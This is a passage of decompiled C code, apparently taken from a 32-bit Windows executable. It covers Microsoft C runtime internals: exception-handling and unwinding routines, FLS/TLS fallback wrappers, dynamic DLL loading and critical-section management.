    int32_t v1; // 0x407d22
    int32_t v2 = *(int32_t *)(v1 + 16); // 0x407d2e
    int32_t v3 = *(int32_t *)(v1 + 12); // 0x407d31
    int32_t v4 = v3; // 0x407d37
    if (*(int32_t *)v2 >= 0) {
        // 0x407d3d
        v4 = v3 + 12 + *(int32_t *)(v2 + 8);
    }
    int32_t * v5 = (int32_t *)(v1 - 4); // 0x407d43
    *v5 = 0;
    int32_t v6 = *(int32_t *)(v1 + 20); // 0x407d47
    int32_t v7 = *(int32_t *)(v1 + 8); // 0x407d4d
    int32_t v8 = function_407db1(v7, v3, v2, v6) - 1; // 0x407d59
    int32_t result; // 0x407d9e
    if (v8 == 0) {
        // 0x407d7f
        function_408874(*(int32_t *)(v7 + 24), v6 + 8);
        // 0x407d97
        *v5 = -2;
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    if (v8 == 1) {
        int32_t v9 = function_408874(*(int32_t *)(v7 + 24), v6 + 8); // 0x407d6c
        function_407d0f(v4, *(int32_t *)(v6 + 24), v9);
    }
    // 0x407d97
    *v5 = -2;
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x407da4 - 0x407da8
int32_t function_407da4(void) {
    // 0x407da4
    return 1;
}

// Address range: 0x407db1 - 0x407ee4
int32_t function_407db1(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x407db1
    function_406770(&g84, 16, (int32_t)&g266);
    int32_t v1; // 0x407db1
    int32_t v2 = *(int32_t *)(v1 + 16); // 0x407dbf
    int32_t v3 = *(int32_t *)(v2 + 4); // 0x407dc2
    int32_t result; // 0x407ed9
    if (v3 == 0 || *(char *)(v3 + 8) == 0) {
        // 0x407ed9
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v4 = *(int32_t *)(v2 + 8); // 0x407dd6
    int32_t v5 = *(int32_t *)v2;
    if (v4 == 0 && v5 >= 0) {
        // 0x407ed9
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v6 = (v5 < 0 ? 0 : v4 + 12) + *(int32_t *)(v1 + 12);
    int32_t * v7 = (int32_t *)(v1 - 4); // 0x407df3
    *v7 = 0;
    int32_t v8 = *(int32_t *)(v1 + 20); // 0x407df6
    int32_t v9; // 0x407db1
    if ((char)v5 >= 0) {
        goto lab_0x407e1d;
    } else {
        // 0x407dfd
        if ((*(char *)v8 & 16) == 0) {
            goto lab_0x407e1d;
        } else {
            // 0x407e02
            *(int32_t *)(v1 - 28) = g184;
            if (g184 == 0) {
                goto lab_0x407e1d;
            } else {
                // 0x407e0e
                v9 = function_4065bf();
                goto lab_0x407e28;
            }
        }
    }
  lab_0x407e1d:;
    int32_t v10 = *(int32_t *)(v1 + 8); // 0x407e1d
    int32_t * v11; // 0x407db1
    int32_t v12; // 0x407db1
    if ((v5 & 8) == 0) {
        char v13 = *(char *)v8; // 0x407e41
        int32_t v14 = *(int32_t *)(v10 + 24);
        if ((v13 & 1) == 0) {
            bool v15 = v6 == 0 | v14 == 0;
            if (*(int32_t *)(v8 + 24) != 0) {
                if (v15) {
                    // 0x407edf
                    function_40a896();
                    // UNREACHABLE
                }
                // 0x407eb6
                *(int32_t *)(v1 - 32) = (v13 & 4) != 0 ? 2 : 1;
            } else {
                if (v15) {
                    // 0x407edf
                    function_40a896();
                    // UNREACHABLE
                }
                int32_t v16 = function_408874(v14, v8 + 8); // 0x407e9b
                function_4088e0(v6, (int16_t *)v16, (int32_t)&g266);
            }
            // 0x407ec3
            *v7 = -2;
            // 0x407ed9
            result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
        if (v6 == 0 || v14 == 0) {
            // 0x407edf
            function_40a896();
            // UNREACHABLE
        }
        int32_t * v17 = (int32_t *)(v8 + 20); // 0x407e58
        function_4088e0(v6, (int16_t *)v14, *v17);
        if (*v17 != 4) {
            // 0x407ec3
            *v7 = -2;
            // 0x407ed9
            result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
        int32_t * v18 = (int32_t *)v6;
        int32_t v19 = *v18; // 0x407e6d
        v11 = v18;
        v12 = v19;
        if (v19 == 0) {
            // 0x407ec3
            *v7 = -2;
            // 0x407ed9
            result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
        goto lab_0x407e78;
    } else {
        // 0x407e25
        v9 = *(int32_t *)(v10 + 24);
        goto lab_0x407e28;
    }
  lab_0x407e78:
    // 0x407e78
    *v11 = function_408874(v12, v8 + 8);
    // 0x407ec3
    *v7 = -2;
    // 0x407ed9
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
  lab_0x407e28:
    // 0x407e28
    if (v6 == 0 || v9 == 0) {
        // 0x407edf
        function_40a896();
        // UNREACHABLE
    }
    int32_t * v20 = (int32_t *)v6;
    *v20 = v9;
    v11 = v20;
    v12 = v9;
    goto lab_0x407e78;
}

// Address range: 0x407ee5 - 0x407fb1
int32_t function_407ee5(void) {
    int32_t v1 = &g82; // bp-8, 0x407ee7
    function_406770(&g82, 16, (int32_t)&g266);
    int32_t v2; // 0x407ee5
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x407ef1
    int32_t * v4 = (int32_t *)(v2 + 16); // 0x407ef4
    int32_t v5 = *v3 + 8;
    int32_t v6; // 0x407ee5
    if (*(int32_t *)(*v4 + 4) > 128) {
        // 0x407f06
        v6 = *(int32_t *)v5;
    } else {
        // 0x407f00
        v6 = (int32_t)*(char *)v5;
    }
    int32_t * v7 = (int32_t *)(v2 - 28); // 0x407f09
    *v7 = v6;
    int32_t * v8 = (int32_t *)(function_407362() + 24); // 0x407f11
    *v8 = *v8 + 1;
    int32_t * v9 = (int32_t *)(v2 - 4); // 0x407f14
    *v9 = 0;
    int32_t * v10 = (int32_t *)(v2 + 20); // 0x407f18
    int32_t v11 = v6; // 0x407f1b
    if (v6 == *v10) {
      lab_0x407f78:
        // 0x407f78
        *v9 = -2;
        function_407f98();
        if (v11 != *v10) {
            // 0x407fac
            function_40a896();
            // UNREACHABLE
        }
        // 0x407f89
        *(int32_t *)(*v3 + 8) = v11;
        int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x407f8f
        return result;
    }
    int32_t * v12 = (int32_t *)(v2 - 32);
    int32_t v13 = v6; // 0x407f70
    int32_t v14 = &v1; // 0x407f54
    while (v13 >= 0) {
        int32_t v15 = *v4; // 0x407f26
        if (v13 >= *(int32_t *)(v15 + 4)) {
            // break -> 0x407fac
            break;
        }
        int32_t v16 = v14;
        int32_t * v17 = (int32_t *)(v15 + 8); // 0x407f2e
        int32_t v18 = *v17; // 0x407f2e
        int32_t v19 = 8 * v13; // 0x407f31
        int32_t v20 = *(int32_t *)(v18 + v19); // 0x407f31
        *v12 = v20;
        *v9 = 1;
        int32_t v21 = v19 | 4;
        v14 = v16;
        if (*(int32_t *)(v18 + v21) != 0) {
            int32_t v22 = *v3; // 0x407f45
            *(int32_t *)(v22 + 8) = v20;
            *(int32_t *)(v16 - 4) = 259;
            *(int32_t *)(v16 - 8) = v22;
            v14 = v16 - 12;
            *(int32_t *)v14 = *(int32_t *)(*v17 + v21);
            function_407470((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        }
        // 0x407f6c
        *v9 = 0;
        v13 = *v12;
        *v7 = v13;
        v11 = v13;
        if (v13 == *v10) {
            goto lab_0x407f78;
        }
    }
    // 0x407fac
    function_40a896();
    // UNREACHABLE
}

// Address range: 0x407f98 - 0x407fac
int32_t function_407f98(void) {
    int32_t v1 = function_407362(); // 0x407f98
    int32_t result = v1; // 0x407fa1
    if (*(int32_t *)(v1 + 24) >= 1) {
        // 0x407fa3
        result = function_407362();
        int32_t * v2 = (int32_t *)(result + 24); // 0x407fa8
        *v2 = *v2 - 1;
    }
    // 0x407fab
    return result;
}

// Address range: 0x407fb2 - 0x4080af
int32_t function_407fb2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x407fb2
    function_40813d(a3);
    if (*(int32_t *)(function_407362() + 32) != 0) {
        goto lab_0x407fff;
    } else {
        // 0x407fdd
        switch (*(int32_t *)a1) {
            case -0x1f928c9d: {
                goto lab_0x407fff;
            }
            case -0x7fffffda: {
                goto lab_0x407fff;
            }
            default: {
                // 0x407fed
                if ((*(int32_t *)a5 & 0x1ffffffe) >= 0x19930522) {
                    // 0x407ff5
                    if ((*(char *)(a5 + 32) & 1) != 0) {
                        // 0x4080aa
                        return 1;
                    }
                }
                goto lab_0x407fff;
            }
        }
    }
  lab_0x407fff:
    // 0x407fff
    if ((*(char *)(a1 + 4) & 102) != 0) {
        // 0x408005
        if (!((a6 != 0 | *(int32_t *)(a5 + 4) == 0))) {
            // 0x408017
            function_407ee5();
        }
        // 0x4080aa
        return 1;
    }
    // 0x40802a
    if (*(int32_t *)(a5 + 12) == 0) {
        uint32_t v1 = *(int32_t *)a5 & 0x1fffffff; // 0x408031
        if (v1 < 0x19930521) {
            // 0x4080aa
            return 1;
        }
        // 0x40803a
        if (*(int32_t *)(a5 + 28) == 0) {
            // 0x40803f
            if (v1 < 0x19930522 || (*(char *)(a5 + 32) & 4) == 0) {
                // 0x4080aa
                return 1;
            }
        }
    }
    // 0x408049
    if (*(int32_t *)a1 != -0x1f928c9d || *(int32_t *)(a1 + 16) < 3 || *(int32_t *)(a1 + 20) <= 0x19930522) {
        // 0x40808b
        function_4077c7(a1, a2, a3, a4, a5, (char)a8, a6, a7);
        // 0x4080aa
        return 1;
    }
    // 0x40805c
    if (*(int32_t *)(*(int32_t *)(a1 + 28) + 8) != 0) {
        // 0x4080aa
        return function_4065bf();
    }
    // 0x40808b
    function_4077c7(a1, a2, a3, a4, a5, (char)a8, a6, a7);
    // 0x4080aa
    return 1;
}

// Address range: 0x4080af - 0x40813d
int32_t function_4080af(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x4080b8
    if (v1 == 0) {
        // 0x408138
        return 1;
    }
    int32_t v2 = v1 + 8; // 0x4080bf
    char v3 = *(char *)v2; // 0x4080c2
    if (v3 == 0) {
        // 0x408138
        return 1;
    }
    unsigned char v4 = *(char *)a1; // 0x4080c7
    if (v4 <= 255) {
        // 0x4080cf
        if ((*(char *)a2 & 16) != 0) {
            // 0x408138
            return 1;
        }
    }
    int32_t v5 = *(int32_t *)(a2 + 4); // 0x4080d4
    if (v1 != v5) {
        int32_t v6 = v5 + 8; // 0x4080dd
        int32_t v7 = v2; // 0x4080e4
        int32_t v8 = v6; // 0x4080e4
        if (v3 != *(char *)v6) {
            // 0x408138
            return 0;
        }
        char v9 = v3; // 0x4080e4
        while (v9 != 0) {
            char v10 = *(char *)(v7 + 1); // 0x4080ea
            if (v10 != *(char *)(v8 + 1)) {
                // 0x408138
                return 0;
            }
            if (v10 == 0) {
                // break -> 0x40810d
                break;
            }
            // 0x4080f2
            v7 += 2;
            v8 += 2;
            v9 = *(char *)v7;
            if (v9 != *(char *)v8) {
                // 0x408138
                return 0;
            }
        }
    }
    // 0x40810d
    if ((v4 & 8) == 0 == ((*(char *)a2 & 2) != 0)) {
        // 0x408138
        return 0;
    }
    char v11 = *(char *)a3; // 0x40811a
    if ((v4 & 1) == 0 != (v11 & 1) != 0) {
        // 0x408124
        return (v4 & 2) != 0 | (v11 & 2) == 0;
    }
    // 0x408138
    return 0;
}

// Address range: 0x40813d - 0x40816d
int32_t function_40813d(int32_t a1) {
    // 0x40813d
    return 0x4065bf;
}

// Address range: 0x40816d - 0x40819a
int32_t function_40816d(int32_t a1, int32_t a2) {
    // 0x40816d
    return 0x4065bf;
}

// Address range: 0x40819a - 0x4081d6
int32_t function_40819a(void) {
    // 0x4081a3
    int32_t v1; // bp-8, 0x40819a
    int32_t v2 = &v1; // 0x40819b
    *(int32_t *)(v2 - 4) = 0;
    *(int32_t *)(v2 - 8) = 4000;
    *(int32_t *)(v2 - 12) = (int32_t)&g179;
    int32_t v3 = function_408429((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x4081ab
    int32_t result; // 0x40819a
    if (v3 == 0) {
        // 0x4081cc
        result = function_4081d6() & -256;
    } else {
        // 0x4081c8
        g180 = (int32_t)g180 + 1;
        result = v3 & -256 | 1;
    }
    // 0x4081d3
    return result;
}

// Address range: 0x4081d6 - 0x408205
int32_t function_4081d6(void) {
    int32_t v1 = g180; // 0x4081d7
    if (v1 == 0) {
        // 0x408201
        int32_t v2; // 0x4081d6
        return v2 & -256 | 1;
    }
    // 0x4081e1
    int32_t v3; // bp-8, 0x4081d6
    int32_t v4 = &v3; // 0x4081e5
    int32_t v5 = v1; // 0x4081e5
    int32_t v6 = 24 * v1 + (int32_t)&g178; // 0x4081e5
    v4 -= 4;
    *(int32_t *)v4 = v6;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    g180 = (int32_t)g180 - 1;
    v5--;
    v6 -= 24;
    while (v5 != 0) {
        // 0x4081eb
        v4 -= 4;
        *(int32_t *)v4 = v6;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        g180 = (int32_t)g180 - 1;
        v5--;
        v6 -= 24;
    }
    // 0x408201
    return (int32_t)&g266 & -256 | 1;
}

// Address range: 0x408205 - 0x4082cb
int32_t function_408205(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t result = 0; // 0x4082b8
    if (a1 == a2) {
        // 0x4082c0
        return result;
    }
    int32_t v1 = a1; // 0x4082b2
    int32_t v2; // bp-20, 0x408205
    int32_t v3 = &v2; // 0x408205
    int32_t v4; // 0x408205
    int32_t v5; // 0x408205
    int32_t v6; // 0x408205
    int32_t * v7; // 0x40821d
    while (true) {
      lab_0x408214:;
        int32_t v8 = v3;
        int32_t v9 = 4 * *(int32_t *)v1; // 0x408216
        int32_t lpLibFileName = v9 + (int32_t)&g181; // 0x408216
        v7 = (int32_t *)lpLibFileName;
        int32_t v10 = *v7; // 0x40821d
        v3 = v8;
        result = v10;
        switch (v10) {
            case 0: {
                int32_t v11 = *(int32_t *)(v9 + (int32_t)&g24); // 0x408231
                *(int32_t *)(v8 - 4) = 2048;
                *(int32_t *)(v8 - 8) = 0;
                int32_t v12 = v8 - 12; // 0x40823f
                *(int32_t *)v12 = v11;
                int32_t * v13 = LoadLibraryExW((int16_t *)lpLibFileName, &g266, (int32_t)&g266); // 0x408240
                int32_t v14 = (int32_t)v13; // 0x408240
                v6 = v12;
                v4 = v14;
                if (v13 != NULL) {
                    goto lab_0x40829c;
                } else {
                    // 0x40824c
                    v5 = v12;
                    if (GetLastError() != 87) {
                        goto lab_0x408292;
                    } else {
                        int32_t * v15 = (int32_t *)(v8 - 16); // 0x408257
                        *v15 = 7;
                        int32_t * v16 = (int32_t *)(v8 - 20); // 0x408259
                        *v16 = (int32_t)L"api-ms-";
                        int32_t v17 = v8 - 24; // 0x40825e
                        int32_t * v18 = (int32_t *)v17; // 0x40825e
                        *v18 = v11;
                        int32_t v19 = function_40a9d9((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40825f
                        v5 = v12;
                        if (v19 == 0) {
                            goto lab_0x408292;
                        } else {
                            // 0x40826b
                            *v15 = 7;
                            *v16 = (int32_t)L"ext-ms-";
                            *v18 = v11;
                            int32_t v20 = function_40a9d9((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x408273
                            v5 = v12;
                            if (v20 == 0) {
                                goto lab_0x408292;
                            } else {
                                // 0x40828e
                                *v15 = v14;
                                *v16 = v14;
                                *v18 = v11;
                                int32_t * v21 = LoadLibraryExW((int16_t *)&g266, &g266, (int32_t)&g266); // 0x408282
                                v5 = v17;
                                v6 = v17;
                                v4 = (int32_t)v21;
                                if (v21 != NULL) {
                                    goto lab_0x40829c;
                                } else {
                                    goto lab_0x408292;
                                }
                            }
                        }
                    }
                }
            }
            case -1: {
                goto lab_0x4082b2;
            }
            default: {
                return result;
            }
        }
    }
  lab_0x4082c0_3:
    // 0x4082c0
    return result;
  lab_0x4082b2:
    // 0x4082b2
    v1 += 4;
    result = 0;
    if (v1 == a2) {
        return result;
    }
    goto lab_0x408214;
  lab_0x40829c:;
    int32_t v22 = v4;
    int32_t v23 = v6;
    *v7 = v22;
    int32_t v24 = v23; // 0x4082a5
    if (*v7 != 0) {
        int32_t v25 = v23 - 4; // 0x4082a7
        *(int32_t *)v25 = v22;
        FreeLibrary(&g266);
        v24 = v25;
    }
    // 0x4082ae
    v3 = v24;
    result = v22;
    if (v22 != 0) {
        // break -> 0x4082c0
        goto lab_0x4082c0_3;
    }
    goto lab_0x4082b2;
  lab_0x408292:
    // 0x408292
    *v7 = -1;
    v3 = v5;
    goto lab_0x4082b2;
}

// Address range: 0x4082cb - 0x40833a
int32_t function_4082cb(int32_t a1, char * lpProcName, int32_t * a3, char * a4, int32_t a5, int32_t a6) {
    int32_t * v1 = (int32_t *)(4 * a1 + (int32_t)&g182); // 0x4082d9
    uint32_t v2 = g112 & 31; // 0x4082e3
    int32_t v3 = g112 ^ *v1; // 0x4082e6
    int32_t result = v3; // 0x4082e8
    if (v2 != 0) {
        result = v3 << 32 - v2 | v3 >> v2;
    }
    if (result == -1) {
        // 0x408337
        return 0;
    }
    // 0x4082f3
    if (result != 0) {
        // 0x408337
        return result;
    }
    int32_t v4 = (int32_t)a3;
    int32_t v5 = v4; // bp-20, 0x4082ff
    int32_t v6; // 0x4082cb
    int32_t v7; // 0x4082cb
    int32_t v8; // 0x4082cb
    int32_t hModule = function_408205(v4, (int32_t)a4, v7, v6, v8); // 0x408302
    int32_t v9; // bp-12, 0x4082cb
    int32_t * v10 = &v9; // 0x40830b
    if (hModule != 0) {
        // 0x40830d
        v5 = hModule;
        int32_t (*func)() = GetProcAddress((int32_t *)hModule, lpProcName); // 0x408311
        v10 = &v5;
        if (func != NULL) {
            int32_t result2 = (int32_t)func; // 0x408311
            *v1 = function_405b90(result2);
            // 0x408337
            return result2;
        }
    }
    // 0x40832a
    *(int32_t *)((int32_t)v10 - 4) = -1;
    *v1 = function_405b90((int32_t)&g266);
    // 0x408337
    return 0;
}

// Address range: 0x40833a - 0x408375
int32_t function_40833a(int32_t a1) {
    // 0x40833a
    int32_t v1; // 0x40833a
    int32_t v2; // 0x40833a
    if (function_4082cb(0, "FlsAlloc", &g25, "FlsAlloc", v1, v2) == 0) {
        // 0x40836d
        return TlsAlloc();
    }
    // 0x40835d
    return function_4065bf();
}

// Address range: 0x408375 - 0x4083b0
int32_t function_408375(int32_t dwTlsIndex) {
    // 0x408375
    int32_t result; // 0x408375
    int32_t v1; // 0x408375
    int32_t v2; // 0x408375
    if (function_4082cb(1, "FlsFree", &g26, "FlsFree", v1, v2) == 0) {
        // 0x4083a7
        result = TlsFree(dwTlsIndex);
    } else {
        // 0x40839b
        result = function_4065bf();
    }
    // 0x4083ad
    return result;
}

// Address range: 0x4083b0 - 0x4083eb
int32_t function_4083b0(int32_t dwTlsIndex) {
    // 0x4083b0
    int32_t result; // 0x4083b0
    int32_t v1; // 0x4083b0
    int32_t v2; // 0x4083b0
    if (function_4082cb(2, "FlsGetValue", &g27, "FlsGetValue", v1, v2) == 0) {
        // 0x4083e2
        result = (int32_t)TlsGetValue(dwTlsIndex);
    } else {
        // 0x4083d6
        result = function_4065bf();
    }
    // 0x4083e8
    return result;
}

// Address range: 0x4083eb - 0x408429
int32_t function_4083eb(int32_t dwTlsIndex, int32_t lpTlsValue) {
    // 0x4083eb
    int32_t result; // 0x4083eb
    int32_t v1; // 0x4083eb
    int32_t v2; // 0x4083eb
    if (function_4082cb(3, "FlsSetValue", &g28, "FlsSetValue", v1, v2) == 0) {
        // 0x408420
        result = TlsSetValue(dwTlsIndex, (int32_t *)lpTlsValue);
    } else {
        // 0x408414
        result = function_4065bf();
    }
    // 0x408426
    return result;
}

// Address range: 0x408429 - 0x408470
int32_t function_408429(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3) {
    // 0x408429
    int32_t v1; // 0x408429
    int32_t v2; // 0x408429
    int32_t v3 = function_4082cb(4, "InitializeCriticalSectionEx", (int32_t *)&g29, "InitializeCriticalSectionEx", v1, v2); // 0x40843e
    int32_t result; // 0x408429
    if (v3 == 0) {
        // 0x408461
        result = InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)lpCriticalSection, dwSpinCount);
    } else {
        // 0x40844c
        result = function_4065bf();
    }
    // 0x40846d
    return result;
}

// Address range: 0x408470 - 0x408499
int32_t function_408470(void) {
    int32_t result = &g182; // 0x40848a
    int32_t v1 = 0; // 0x40848a
    v1++;
    *(int32_t *)result = g112;
    result += 4;
    while (v1 != ((int32_t)&g183 - ((int32_t)&g183 + (int32_t)(&g183 < &g182)) & -5) + 5) {
        // 0x40848d
        v1++;
        *(int32_t *)result = g112;
        result += 4;
    }
    // 0x408497
    return result;
}

// Address range: 0x408499 - 0x4084cb
int32_t function_408499(int32_t a1) {
    int32_t result; // 0x408499
    if ((char)a1 != 0) {
        // 0x4084c9
        return result;
    }
    // 0x4084a2
    int32_t v1; // bp-8, 0x408499
    int32_t v2 = &v1; // 0x4084a3
    int32_t v3 = (int32_t)&g181; // 0x4084a3
    int32_t v4; // 0x408499
    int32_t v5; // 0x408499
    int32_t v6; // 0x408499
    int32_t * v7; // 0x4084a8
    int32_t v8; // 0x4084b2
    while (true) {
      lab_0x4084a8:;
        int32_t v9 = v2;
        v7 = (int32_t *)v3;
        int32_t v10 = *v7; // 0x4084a8
        v8 = v9;
        v5 = v4;
        v2 = v9;
        v6 = v4;
        switch (v10) {
            case 0: {
                goto lab_0x4084bd;
            }
            case -1: {
                goto lab_0x4084ba;
            }
            default: {
                // 0x4084b2
                v8 = v9 - 4;
                *(int32_t *)v8 = v10;
                v5 = FreeLibrary(&g266);
                goto lab_0x4084ba;
            }
        }
    }
    // 0x4084c9
    return result;
  lab_0x4084bd:
    // 0x4084bd
    v3 += 4;
    v4 = v6;
    result = v6;
    if (v3 == (int32_t)&g182) {
        return result;
    }
    goto lab_0x4084a8;
  lab_0x4084ba:
    // 0x4084ba
    *v7 = 0;
    v2 = v8;
    v6 = v5;
    goto lab_0x4084bd;
}

// Address range: 0x4084cb - 0x4084d6
int32_t function_4084cb(void) {
    // 0x4084cb
    g183 = g112;
    return g112;
}

// Address range: 0x4084e0 - 0x408570
int32_t function_4084e0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-40, 0x4084f9
    int32_t v2 = &v1; // 0x4084f9
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x40850b
    int32_t v4; // 0x4084e0
    int32_t result; // 0x408512
    while (true) {
        // 0x408512
        v4 = v3;
        int32_t * v5 = (int32_t *)(v4 + 44); // 0x408519
        result = *(int32_t *)(v4 + 48);
        int32_t * v6 = (int32_t *)(result + 12); // 0x40851f
        uint32_t v7 = *v6; // 0x40851f
        if (v7 == -2) {
            // break (via goto) -> 0x408562
            goto lab_0x408562_2;
        }
        uint32_t v8 = *(int32_t *)(v4 + 52); // 0x408527
        if (v8 != -2 && v7 <= v8) {
            // break (via goto) -> 0x408562
            goto lab_0x408562_2;
        }
        int32_t v9 = (*(int32_t *)*v5 ^ *(int32_t *)(result + 8)) + 16 + 12 * v7; // 0x408537
        *v6 = *(int32_t *)v9;
        while (*(int32_t *)(v9 + 4) != 0) {
            // 0x408512
            result = *(int32_t *)(v4 + 48);
            v6 = (int32_t *)(result + 12);
            v7 = *v6;
            if (v7 == -2) {
                // break (via goto) -> 0x408562
                goto lab_0x408562_2;
            }
            // 0x408527
            v8 = *(int32_t *)(v4 + 52);
            if (v8 != -2 && v7 <= v8) {
                // break (via goto) -> 0x408562
                goto lab_0x408562_2;
            }
            // 0x408534
            v9 = (*(int32_t *)*v5 ^ *(int32_t *)(result + 8)) + 16 + 12 * v7;
            *v6 = *(int32_t *)v9;
        }
        // 0x408546
        v3 = v4 - 4;
        *(int32_t *)v3 = 257;
        function_40876c((int32_t)&g266);
        function_40878b();
    }
  lab_0x408562_2:
    // 0x408562
    __writefsdword(0, *(int32_t *)v4);
    return result;
}

// Address range: 0x408570 - 0x4085b6
int32_t function_408570(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = 1; // 0x408580
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        int32_t v1 = function_4065ae(); // 0x40858b
        int32_t v2 = *(int32_t *)(v1 + 20); // 0x40859a
        function_4084e0(v2, *(int32_t *)(v1 + 16), *(int32_t *)(v1 + 12));
        *(int32_t *)a3 = a2;
        result = 3;
    }
    // 0x4085b5
    return result;
}

// Address range: 0x4085b8 - 0x4085e0
int32_t function_4085b8(int32_t a1) {
    // 0x4085b8
    int32_t v1; // 0x4085b8
    function_40816d(a1, v1);
    int32_t v2 = *(int32_t *)(a1 + 40); // 0x4085d1
    return function_4084e0(v2, *(int32_t *)(a1 + 24), *(int32_t *)(a1 + 28));
}

// Address range: 0x4085e0 - 0x4085f7
int32_t function_4085e0(int32_t a1) {
    // 0x4085e0
    return 0;
}

// Address range: 0x4085f8 - 0x408611
int32_t function_4085f8(void) {
    // 0x4085f8
    function_40876c(1);
    return 0;
}

// Address range: 0x408614 - 0x40862e
int32_t function_408614(void) {
    // 0x408614
    int32_t ExceptionRecord; // 0x408614
    int32_t TargetFrame; // 0x408614
    RtlUnwind((int32_t *)TargetFrame, &g2, (struct _EXCEPTION_RECORD *)ExceptionRecord, NULL);
    return &g266;
}

// Address range: 0x408630 - 0x408647
int32_t function_408630(int32_t a1, int32_t * a2) {
    // 0x408630
    int32_t v1; // 0x408630
    int32_t v2; // 0x408630
    return function_4084e0((int32_t)a2, v2, v1);
}

// Address range: 0x408650 - 0x408671
int32_t function_408650(int32_t TargetFrame) {
    // 0x408650
    RtlUnwind((int32_t *)TargetFrame, &g3, NULL, NULL);
    return &g266;
}

// Address range: 0x408671 - 0x4086b6
int32_t function_408671(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t result = 1; // 0x408681
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        int32_t v1 = function_4065ae(); // 0x40868c
        int32_t v2; // 0x408671
        function_4086b6(*(int32_t *)(v1 + 36), *(int32_t *)(v1 + 40), v2);
        *(int32_t *)a3 = a2;
        result = 3;
    }
    // 0x4086b5
    return result;
}

// Address range: 0x4086b6 - 0x40873a
int32_t function_4086b6(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x4086c6
    int32_t v2 = &v1; // 0x4086c6
    int32_t v3 = g112 ^ v2; // bp-36, 0x4086d4
    int32_t v4 = &v3; // 0x4086d4
    __writefsdword(0, v2);
    int32_t result = *(int32_t *)(v4 + 40); // 0x4086df
    int32_t * v5 = (int32_t *)(result + 12); // 0x4086e6
    int32_t v6 = *v5; // 0x4086e6
    int32_t v7 = v6; // 0x4086ec
    int32_t * v8 = v5; // 0x4086ec
    int32_t v9 = result; // 0x4086ec
    if (v6 == -1) {
        // 0x408728
        __writefsdword(0, *(int32_t *)(v4 + 4));
        return result;
    }
    int32_t v10 = v4;
    uint32_t v11 = *(int32_t *)(v10 + 44); // 0x4086ee
    int32_t v12 = v10; // 0x4086f3
    int32_t result2 = v9; // 0x4086f3
    while (v11 == -1 || v7 > v11) {
        int32_t v13 = *(int32_t *)(v9 + 8) + 12 * v7;
        int32_t v14 = *(int32_t *)v13; // 0x4086fe
        *(int32_t *)(v10 + 12) = v14;
        *v8 = v14;
        int32_t v15 = v10; // 0x40870d
        if (*(int32_t *)(v13 + 4) == 0) {
            // 0x40870f
            v15 = v10 - 4;
            *(int32_t *)v15 = 257;
            function_40876c((int32_t)&g266);
            function_40878b();
        }
        // 0x408726
        v9 = *(int32_t *)(v15 + 40);
        v8 = (int32_t *)(v9 + 12);
        v7 = *v8;
        v12 = v15;
        result2 = v9;
        if (v7 == -1) {
            // break -> 0x408728
            break;
        }
        v10 = v15;
        v11 = *(int32_t *)(v10 + 44);
        v12 = v10;
        result2 = v9;
    }
    // 0x408728
    __writefsdword(0, *(int32_t *)(v12 + 4));
    return result2;
}

// Address range: 0x40873a - 0x40875d
int32_t function_40873a(void) {
    int32_t v1 = __readfsdword(0); // 0x40873c
    if (*(int32_t *)(v1 + 4) != 0x408671) {
        // 0x40875c
        return 0;
    }
    int32_t v2 = *(int32_t *)(*(int32_t *)(v1 + 12) + 12); // 0x40874f
    return *(int32_t *)(v1 + 8) == v2;
}

// Address range: 0x408760 - 0x408769
int32_t function_408760(int32_t a1, int32_t * a2) {
    // 0x408760
    int32_t v1; // 0x408760
    int32_t v2; // 0x408760
    return function_408777(v2, v1);
}

// Address range: 0x40876c - 0x408777
int32_t function_40876c(int32_t a1) {
    // 0x40876c
    int32_t result; // 0x40876c
    return result;
}

// Address range: 0x408777 - 0x40878b
int32_t function_408777(int32_t a1, int32_t a2) {
    // 0x408777
    int32_t result; // 0x408777
    return result;
}

// Address range: 0x40878b - 0x40878e
int32_t function_40878b(void) {
    // 0x40878b
    int32_t result; // 0x40878b
    return result;
}

// Address range: 0x40878e - 0x4087aa
